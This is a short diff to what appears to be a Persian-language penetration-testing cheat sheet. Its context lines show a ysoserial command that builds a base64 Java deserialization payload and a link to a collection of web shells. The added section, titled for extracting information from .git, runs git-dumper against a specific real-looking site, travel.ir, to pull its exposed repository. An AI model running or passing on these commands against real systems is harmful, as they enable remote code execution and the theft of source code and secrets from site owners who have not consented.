@@ -280,3 +280,9 @@ java -jar ysoserial.jar CommonsBeanutils1 'COMMAND' | base64 -w0
 ```text
 https://github.com/TheBinitGhimire/Web-Shells
 ```
+
+## استخراج اطلاعات از .git
+
+```text
+./git-dumper.py http://travel.ir/.git/ travel.ir
+```
